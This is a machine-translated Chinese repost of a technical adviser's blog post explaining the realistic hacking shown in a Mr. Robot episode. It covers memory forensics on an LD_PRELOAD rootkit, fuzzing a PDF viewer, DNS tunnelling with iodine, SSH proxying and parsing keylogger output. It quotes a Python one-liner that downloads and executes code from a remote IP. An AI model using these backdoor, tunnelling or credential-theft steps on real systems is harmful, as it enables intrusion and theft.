


---

   你好朋友。我是[Mr. Robot](https://twitter.com/whoismrrobot)的技术顾问 Ryan Kazanciyan 。自第 2 季后半段以来，我一直与[Kor Adana](https://twitter.com/koradana)（作家、制片人和 ARG 背后的策划者）以及 Mr. Robot 团队的其他成员合作。在整个第 3 季中，我将撰写关于节目，他们如何走到一起，以及他们在现实中的基础。
剧透警报！这篇文章讨论了第 3 季第 9 集中的事件。

---
迎回来！上周的u tstanding - 但没有破解 - 情节让我有机会休息一下，并回顾 Kor 和我在本季剩余时间里收集的制作笔记。结果证明这是一个明智之举，因为我已经忘记了进入“eps3.8_stage3.torrent”技术场景的大量工作。准确地说，二十页笔记、七个视频剪辑、十几个屏幕截图和五个虚拟机快照。

对于本周的帖子，我想提供一个完整的演练，了解 Elliot 如何破坏黑暗军队，包括为我们精通信息安全的观众（以及那些渴望了解更多信息的观众）提供的所有血腥细节。攻击序列包含从内存取证到模糊测试和漏洞利用开发、rootkit 和秘密命令和控制的所有内容。我们的目标不是为了复杂而使事情变得复杂。拥有黑暗军队不应该便宜或容易，即使对艾略特来说也是如此。

我们的标准现实主义免责声明适用。我们必须接受创造性的许可，并适应故事指导的浓缩时间框架。整个攻击在剧集结束时的几分钟内就上演了。在节目的宇宙中，这些事件发生了好几个小时。在现实世界中，这将是几天或几周。但是每个步骤背后的过程和细节仍然是真实的。

## 寻找rootkit
Elliots 的计划始于一个冒险的举动：他必须故意让自己处于危险之中。他安排与格兰特会面，讨论“第 3 阶段”，表面上涉及入侵 Ecoin 以对 E Corp 造成致命一击。实际上，他预计黑暗军队的特工会没收他的笔记本电脑并安装恶意软件，以试图监视他。这为 Elliot 提供了扭转黑暗军队并攻击他们自己系统的机会。

会议如期进行，Elliot 活生生地回到家中。搜寻开始了：他需要确认他的系统已被感染，找到恶意软件并评估其功能。它记录击键吗？窃取文件？它与哪些 C2 地址交互？

正如我在之前的帖子中所介绍的，我在事件响应和违规调查上花费的时间比安全领域的任何其他领域都多。所以我决定为这个场景全力以赴，通过艾略特引导我内心的书呆子，让他炫耀他的一些取证技能。

当我们第一次切换到他的屏幕时，我们看到他一直在使用[Volatility Framework](https://www.volatilityfoundation.org/)——最广泛使用的内存取证工具。此时，Elliot 已经将内存从受感染的系统转储到名为“out.mem”的文件中，并将其移至干净的分析系统中。他现在正在运行一系列分析步骤以搜索 Dark Army 的恶意软件。

为什么 Elliot 会依赖内存取证而不是其他工具或技术？Dark Army 可能已经用 Rootkit 感染了他的系统，从而有效地将他们的恶意软件隐藏在操作系统和其他软件之外。内存分析可以提供对系统证据的低级、纯正视图。内存中的人工制品还可以提供对近期活动的洞察，包括恶意软件的使用，这些活动可能不会在其他地方保存。
![Elliot 使用 Volatility 在内存中寻找 rootkit 的证据](https://i-blog.csdnimg.cn/blog_migrate/acc148d0e9df7037bea308ff5e1cd06a.png)
| Elliot 使用 Volatility 在内存中寻找 rootkit 的证据 |
|--|--|
所有这些镜头都是基于对我在家庭实验室中构建并感染了 rootkit 的 Linux 系统的真实内存映像的分析。让我们来看看每个命令。

```bash
vol.py -f out.mem --profile=kali linux_find_file -F /etc/ld.so.preload
```
第一个参数`--profile kali`告诉 `Volatility` 如何解析内存快照；即它来自什么类型的系统。“kali”不是开箱即用的配置文件；在此步骤之前，Elliot 将经历从源系统生成它的过程。该命令的第二部分`linux_find_file -F /etc/ld.so.preload`，搜索已缓存在内存中的文件。输出 ,`0xffff880028c740c0`是一个 inode 值——描述文件在磁盘上的位置的地址。

```bash
vol.py -f out.mem --profile=kali linux_find_file -i 0xffff880028c740c0 -O ld.so.preload
```

相同的插件，`linux_find_file`但不同的用法。这些命令行参数告诉 `Volatility` 将内存缓存文件的内容转储到指定的 `inode` 地址。“-O”指定转储的输出文件名：`ld.so.preload`. 稍后我们将了解该文件的含义。

```bash
cat ld.so.preload
```

显示`ld.so.preload`上一步从内存中转储的 的内容。该文件是单行：`/usr/local/lib/libhd.so`. Linux 中的“.so”文件类似于 Windows 中的 DLL——它是一个包含可以被进程加载和使用的代码的库。

```bash
vol.py -f out.mem --profile=kali linux_proc_maps | grep libhd.so
```

该`linux_proc_maps`插件揭示了有关正在运行的进程的内存空间的详细信息，包括对它们使用的共享库的引用。此命令的输出通过管道传输到`grep libhd.so`. 简而言之，Elliot 正在寻找使用`libhd.so`. 该命令为进程 ID `39238`（一个 Python 实例）生成两个命中。
让我们暂停一下——为什么 Elliot `/etc/ld.so.preload`首先对文件感兴趣？他正在寻找调试功能 `LD_PRELOAD` 的证据，许多 Linux rootkit 滥用该功能来隐藏其踪迹。`LD_PRELOAD` 允许您指定在任何其他库之前加载的“.so”文件。如果该库实现了任何函数——例如，那些用于列出进程或网络连接的函数——它将覆盖原本从标准系统库中调用的函数。
好的，`libhd.so`是`rootkit`。但它旨在隐藏什么？最后两个波动率命令揭示了更多信息：

```bash
vol.py -f out.mem --profile=kali --pid=39238 linux_psaux
```

列出有关 PID `39238` 的基本详细信息 - 由上一个命令标识的 Python 进程。它的论点肯定看起来很可疑：
![Volatility 进程列表插件“linux_psaux”的输出，揭示了一个基于 Python 的后门](https://i-blog.csdnimg.cn/blog_migrate/62bcbb3fe207368247feb3c2b4ff6aa5.png)
| Volatility 进程列表插件“linux_psaux”的输出，揭示了一个基于 Python 的后门 |
|--|--|

```bash
python -c import urllib;exec urllib.urlopen("http://192.251.68.228/index").read()
```
这是一个第二阶段的后门，通过被 rootkit 隐藏的 Python 进程运行。通过命令行传递的单行指令下载并执行托管在指定 URL 上的任何 Python 代码。在我的虚拟机中构建这个场景时，我使用了一个基于 Python 的后门，该后门由Pupy生成。
最后一个波动率命令：

```bash
vol.py -f out.mem --profile=kali --pid=39238 -D dump/ linux_procdump
```
这会将后门进程的内存转储到一个目录，从而允许 Elliot 对其行为和功能进行进一步分析。

##  制作漏洞利用
下一次我们切换到 Elliot 的屏幕时，我们及时跳到了前面，可以推断他已经完成了对黑暗军队在他系统上的后门的审查。除其他功能外，该恶意软件还监控他的活动并将任何新创建的文件传输到其 C2 服务器之一。

当复杂的攻击组从受害者那里窃取大量数据时，他们通常有一个后端来自动化收集和索引过程。但艾略特是一个高度优先的目标。可以合理地推断，将指派一名人类分析师来审查从他的系统中被盗的任何有趣文件。这让 Elliot 有机会植入恶意 PDF 并等待 Dark Army 操作员打开它。

Elliot 可能对之前与黑暗军队的交易有所了解，但他不能确定他的受害者可能使用哪个 PDF 查看器。为了最大限度地提高成功几率，他可能不得不将多个漏洞利用捆绑在一起——包括一些未修补的零日漏洞。所有这一切最多可能需要几天或几周的时间，即使他有大量的错误和先前的研究来启动他的努力。为了在这个场景的限制下工作，我们不得不使用一些创造性的许可，并将工作量减少到几个小时。

无论时机如何，我都想确保我们捕获了漏洞发现过程的准确元素。首先是找到一个可以用来执行恶意代码的错误。

![漏洞研究的行业工具：afl-fuzz 和 gdb](https://i-blog.csdnimg.cn/blog_migrate/131c5d95588b6f794320b15b385ddbbc.png)
| 漏洞研究的行业工具：afl-fuzz 和 gdb |
|--|--|

这张照片包括两个窗口：背景是[American Fuzzy Lop](https://lcamtuf.coredump.cx/afl/) (afl-fuzz)，前景是[GNU 调试器](https://www.sourceware.org/gdb/)(gdb)。`Afl-fuzz` 是一个“fuzzer”——一种自动生成大量无效数据、通过应用程序输入运行并监控崩溃和其他错误的工具。`afl-fuzz` 除了因其强大的功能而受到 bug 猎人的欢迎外，它在运动中看起来真的很酷（尤其是对于控制台应用程序），所以我认为它非常适合这个场景。

请注意窗口顶部的文本：`american fuzzy lop 1.83b` (evince)。“evince”是被模糊测试的应用程序的标题——它是许多 Linux 发行版的默认 PDF 查看器。这告诉我们 Elliot 计划将他的漏洞利用嵌入到文档文件中。
![afl-fuzz 屏幕的原始模型](https://i-blog.csdnimg.cn/blog_migrate/d1fd5b7493f6edd730c2e188c96902a3.png)
| afl-fuzz 屏幕的原始模型 |
|--|--|

一个模糊器可能会识别出几十个崩溃；下一步是评估其中哪些可能导致可利用的漏洞。这就是前台窗口中的 gdb 调试器发挥作用的地方。根据提示，我们可以看到 Elliot 正在使用一个插件“ [gdp-peda](https://github.com/longld/peda) ”，它为漏洞利用开发提供了有用的功能。

他首先使用 gdb “run” 命令重播 afl-fuzz 识别的崩溃场景之一：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/58f146b57d4deaaf58327ff09c042cc0.png)
Gdb 报告分段错误：
![加载由 afl-fuzz 生成的格式错误的输入之一后，evince 中的分段错误](https://i-blog.csdnimg.cn/blog_migrate/cf8bebb2663e73a67da4bdc6e9a4bbcd.png)
|加载由 afl-fuzz 生成的格式错误的输入之一后，evince 中的分段错误 |
|--|--|

这个漏洞可以利用吗？Elliot 将进行进一步的分析，以检查系统在崩溃时的状态。在我最初的模型中，我设计了更多他在 gdb 中运行附加命令的屏幕。这些最终被削减了时间：

![原始模型 — Elliot 使用 gdb-peda 进行了一些额外的崩溃分析](https://i-blog.csdnimg.cn/blog_migrate/b171a1a8aa5e16a8f1bcdf05f4f098d2.png)
|原始模型 — Elliot 使用 gdb-peda 进行了一些额外的崩溃分析 |
|--|--|
作为记录，不，我实际上并没有在“evince”中发现任何可利用的漏洞。`afl-fuzz` 和 `gdb` 屏幕都是基于这些工具的真实使用，但我选择（并重命名）另一个有很多崩溃错误的二进制文件作为目标）。

下一个屏幕是在另一个时间跳跃之后出现的。Elliot 正在编写基于 Python 的漏洞利用代码，该代码利用了他从模糊测试中发现的错误之一。该窗口包含 shellcode，以及对携带有效负载的 PDF 文件名的引用：“ecoin_vuln_notes.pdf”。
![Elliot 用于“evince”的 PDF 漏洞利用中的 Shellcode](https://i-blog.csdnimg.cn/blog_migrate/fd6c13866154ce3509d0697048101943.png)
|Elliot 用于“evince”的 PDF 漏洞利用中的 Shellcode |
|--|--|

在完成漏洞利用并合并它需要传递的任何恶意软件后，Elliot 可以将文件复制回受感染的系统。那么就等着黑暗军团上钩了。
## 回击（隧道中的隧道）
一名黑暗军队的操作员，负责检查一个装满被盗文件的收件箱的枯燥工作，打开了 Elliot 的 PDF。“evince”查看器启动，稍稍延迟后，显示文件——Ecoin Loans 的普通广告。他不知情且毫无戒心地关闭了文件并继续进行。当然，这足以触发 Elliot 的攻击并进行第一阶段的攻击。
![一名黑暗军队操作员上钩并打开了 Elliot 的 PDF](https://i-blog.csdnimg.cn/blog_migrate/59421b24d3ba6f2d443f3294d6b82806.png)
|一名黑暗军队操作员上钩并打开了 Elliot 的 PDF |
|--|--|
在背景中，我们看到了 Dark Army 基于 Web 的控制面板的一部分。该站点是 Elliot 的最终目标：通过适当的访问级别，它将提供监控和管理其在世界各地的所有受感染系统的能力。当然，该站点不仅位于互联网上——它还位于 Dark Army 的专用网络上。Elliot 需要通过操作员受感染的系统进行隧道传输，并一路窃取他的登录凭据。

我希望 Elliot 最初的妥协是建立一个可以绕过典型防火墙规则的隐蔽命令和控制通道。我最终围绕一个名为iodine的开源工具设计了接下来的几个镜头，它提供了通过 DNS 隧道传输 IPv4 流量的能力。这将建立从受感染操作员系统返回到 Elliot 控制服务器的通信通道。

我们在另一个时间跳转后返回到 Elliot 的屏幕。期间，Elliot 利用他在运营商系统上的立足点设置了 iodine 并窃取 SSH 密钥，并安装了额外的恶意软件。

![Elliot 连接到 Dark Army 操作员的受感染系统](https://i-blog.csdnimg.cn/blog_migrate/8cd83988592b6a2cd4927cd7ef78e57f.png)
|Elliot 连接到 Dark Army 操作员的受感染系统 |
|--|--|

左边的窗口显示 Elliot 设置 DNS 隧道的接收端并为他的服务器分配一个不可路由的 IPv4 地址以在隧道内使用。

```bash
root@kali:~# iodined -f 172.17.0.1 u1rbr0uz.net
Enter password: 
Opened dns0
Setting IP of dns0 to 172.17.0.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain test.com
```
右侧的窗口显示 Elliot 使用先前被盗的 SSH 密钥 SSH 到隧道内受害者系统自己的地址。

```bash
root@kali:~# ssh garyhost@172.17.0.2 -q -C -D 22381
Welcome to Ubuntu Kylin 14.04.3 LTS (GNU/Linux 3.19.0–25-generic i686)
```
SSH 选项“`-D 22381`”选项通过连接设置 SOCKS 代理，绑定到本地端口 22381。Elliot 现在可以配置浏览器以使用该代理端点，并通过 Dark Army 运营商的系统路由他的 Web 访问。这是一个疯狂的隧道套娃：`HTTP over SSH over DNS via iodine`。它确实有效（我在实验室中对其进行了测试以确保它）——尽管速度很慢。

有了这种连接，Elliot 就有能力访问 Dark Army 的私人网络基础设施。但他仍然需要 URL 以及用户名和密码才能登录控制面板。

Elliot 攻击的第一阶段——屏幕上没有显示——在“garyhost”上放置了一个击键记录器。在下一个屏幕中，我们看到 Elliot 正在搜索它迄今为止捕获的数据。

![Elliot 搜索键盘记录器输出文件。ARG 的粉丝可能想尝试连接到该 IP……](https://i-blog.csdnimg.cn/blog_migrate/66e17e9275200b575c8a82d762fac6e5.png)
|Elliot 搜索键盘记录器输出文件。ARG 的粉丝可能想尝试连接到该 IP…… |
|--|--|
Elliot 将三个命令串在一起

```bash
cat /dev/nu11
```
显示 keylog 输出文件的内容，伪装成合法的 Unix 设备“/dev/null”（注意数字 1 而不是字母 'l'）。

```bash
sed 's/\[ENTR\]/&\n/g'
```

每当键盘记录器记录“[ENTR]”键时，解析输出以生成新行。这只是为了可读性和易于分析。

```bash
grep -C 1 -i garyhost

```
搜索字符串“garyhost”——Dark Army 操作员的用户名——并在任何匹配项的上方和下方返回一行。Elliot 正在尝试查找按连续顺序输入的地址、用户名和密码。他得到一击：

```bash
192.251.68.236[ENTR]
garyhost[ENTR]
huntr[BS]er3[BS]2[ENTR]
```
键盘记录序列“[BS]”代表退格——所以 Gary 的密码是“hunter2”。看起来 Dark Army 可以更好地为其内部 Web 应用程序强制执行强凭据（或两因素身份验证）。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9929e6cf23b5447a69d68205ee6c0021.png)
Elliot 登录。密码有效。他现在拥有黑暗军队——或者至少是他们基础设施的关键部分。通过访问他们基于 Web 的控制面板，他可以看到他们在全球范围内进行黑客攻击的真实规模和范围。
![黑暗军队主控制面板的原始模型](https://i-blog.csdnimg.cn/blog_migrate/1250c264d9e67778cc31a723fadb0953.png)
|黑暗军队主控制面板的原始模型 |
|--|--|

请注意地图左侧列出的组织。黑暗军团显然一直很忙。其中许多反映了政府机构和非营利组织在现实世界中遭受了归因于中国民族国家黑客和其他威胁团体的妥协。
安全研究人员可能会认识到，我们的设计深受“Beta Bot”恶意软件控制面板的启发，如下所示：
![“Beta Bot”僵尸网络的基于 Web 的控制面板](https://i-blog.csdnimg.cn/blog_migrate/57b3e28eff420c604040bb5aede603fc.png)
|黑暗军队主控制面板的原始模型 |
|--|--|


许多命令和控制框架——尤其是那些用于管理一些世界上最大的僵尸网络的框架——具有令人惊讶的精心设计的用户界面！

如果您已经做到了这一点，您可能会注意到与 Trenton 的电子邮件、Romero 的键盘记录器或 FBI Sentinel 相关的任何内容明显缺失。随着第三季接近尾声，还有更多的秘密和技巧需要揭开。下周我会回来用最后一期的“Mr. 机器人：拆卸”。

---
参考链接：

 - [https://medium.com/@ryankazanciyan](https://medium.com/@ryankazanciyan)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/615100fe64c3583b9e4b07b35d7edf34.gif#pic_center)

